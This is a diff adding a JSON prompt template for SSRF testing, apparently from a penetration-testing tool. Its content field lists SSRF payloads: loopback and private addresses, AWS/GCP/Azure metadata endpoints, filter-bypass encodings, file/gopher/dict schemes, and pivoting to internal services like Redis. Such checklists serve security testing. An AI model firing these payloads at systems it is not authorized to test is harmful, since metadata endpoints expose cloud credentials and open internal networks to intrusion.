@@ -1,0 +1,10 @@
+{
+  "name": "SSRF Testing",
+  "description": "Server-side request forgery testing",
+  "category": "web",
+  "variables": [
+    "url",
+    "parameter"
+  ],
+  "content": "Test SSRF vulnerabilities at {url} in parameter {parameter}.\n\nInternal targets to test :\n```\nhttp://127.0.0.1\nhttp://localhost\nhttp://[::1]\nhttp://169.254.169.254 (cloud metadata)\nhttp://192.168.0.1\nhttp://10.0.0.1\n```\n\nCloud metadata endpoints :\n- AWS: `http://169.254.169.254/latest/meta-data/`\n- GCP: `http://metadata.google.internal/`\n- Azure: `http://169.254.169.254/metadata/instance`\n\nFilter bypass :\n```\nhttp://127.1\nhttp://0x7f000001\nhttp://2130706433\nhttp://127.0.0.1.nip.io\n```\n\nAlternative protocols : `file://`, `gopher://`, `dict://`\n\nIf SSRF is confirmed, try accessing internal services (Redis, Elasticsearch, etc.)."
+}
